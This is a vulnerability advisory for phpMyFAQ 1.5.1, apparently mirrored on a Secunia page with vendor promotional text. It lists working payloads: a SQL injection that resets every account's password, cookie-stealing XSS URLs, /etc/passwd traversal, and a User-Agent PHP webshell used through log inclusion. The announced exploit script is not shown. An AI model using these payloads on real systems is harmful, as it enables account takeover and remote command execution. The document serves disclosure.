PhpMyFaq 1.5.1 SQL injection / board takeover / user info disclosure / path \
disclosure remote code / commands execution

software:
site: <http://www.phpmyfaq.de/>
description: "phpMyFAQ is a multilingual, completely database-driven FAQ-system.
It supports various databases to store all data, PHP 4.1.0 (or higher) is needed
in order to access this data. phpMyFAQ also offers a multi-language Content
Management-System with a WYSIWYG editor and an Image Manager, flexible multi-user
support with LDAP support, a news-system, user-tracking, language modules,
enhanced automatic content negotiation, templates, extensive XML-support,
PDF-support, a backup-system, a dynamic sitempa and an easy to use installation \
script."

vulnerabilities:

1) if magic quotes off -> SQL injection:
   just take a look at vulnerable code in /admin/password.php:
   ...
        $username = $_POST["username"];
        $email = $_POST["email"];
        $num = $db->num_rows($db->query("SELECT name, email FROM ".SQLPREFIX."faquser \
WHERE name = '".$username."' AND email = '".$email."'"));  if ($num == 1) {
            $consonants = \
array("b","c","d","f","g","h","j","k","l","m","n","p","r","s","t","v","w","x","y","z");
  $vowels = array("a","e","i","o","u");
            $newPassword = "";
            srand((double)microtime()*1000000);
            for ($i = 1; $i <= 4; $i++) {
                $newPassword .= $consonants[rand(0,19)];
                $newPassword .= $vowels[rand(0,4)];
                }
            $db->query("UPDATE ".SQLPREFIX."faquser SET pass = \
                '".md5($newPassword)."' WHERE name = '".$username."' AND email = \
                '".$email."'");
            $text = $PMF_LANG["lostpwd_text_1"]."\nUsername: ".$username."\nNew \
                Password: ".$newPassword."\n\n".$PMF_LANG["lostpwd_text_2"];
            mail($IDN->encode($email), $PMF_CONF["title"].": username / password \
                request", $text, "From: ".$IDN->encode($PMF_CONF["adminmail"]));
   ...

   switch to /admin directory, click on "forgotten password" feature
   and  without to have an account you can reset
   admin password and send yourself it by email, example:

   user: ' or isnull(1/0) /*
   mail: [your_email]

   the two queries become:

   SELECT name, email FROM phpmyfaq_faquser WHERE name = '' or isnull(1/0) /*' AND \
email = '[your_email]'

   and

   UPDATE phpmyfaq_faquser SET pass = '[password_hash]' WHERE name = '' or \
isnull(1/0) /*' AND email = '[your_email]'

   (so all accounts have the same new password... not only admin one)

   [your_email] , now is passed to mail() funxtion

   you will soon receive a mail like this:

  "Thank you for requesting your account information.
   Username: ' or isnull(1/0) /*
   New Password: relicuxe

   Please set a new personal password in the admin section of your FAQ."

   now you can login, backup database, add/delete news, records, ban ip and execute
   commands on target system by inserting php code in news, system calls, etc.

2) cross site scripting:

http://[target]/[path]/phpmyfaq/admin/footer.php?PMF_CONF[version]=<script>alert(document.cookie)</script>
 http://[target]/[path]/phpmyfaq/admin/header.php?PMF_LANG[metaLanguage]="><script>alert(document.cookie)</script>

3) arbitrary inclusion (on Windows):
   if magic_quotes_gpc off in php.ini settings you can see ANY file on target system:
   http://[target]/[path]/phpmyfaq/index.php?LANGCODE=/../../../../../../etc/passwd%00

4) if magic_quotes both on and off you can include an arbitrary php file
   on the target machine:

   http://[target]/[path]/phpmyfaq/index.php?LANGCODE=/../../../../[scriptname]

   [scriptname] without '.php' extension

5) user info disclosure:

   http://[target]/[path]/phpmyfaq/data/tracking[date]

   where [date] is today date, example: 22092005
   you will see the log file...

6) path disclosure:
   http://[target]/[path]/phpmyfaq/index.php?LANGCODE=[a_non_existent_file]

7) you can insert php code in a User Agent field request packet, example:

   <?php system($HTTP_GET_VARS[cmd]) ?>

   and, if magic_quotes is off, you can include log file to execute shell commands \
(this on Windows)

   http://[target]/[path]/phpmyfaq/index.php?cmd=ls%20-la&LANGCODE=/../../data/tracking[date]%00

this is my proof of concept exploit (it works against Windows servers, so it's only a \
divertisement but OK, we are admin, remember? ;) ...):

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
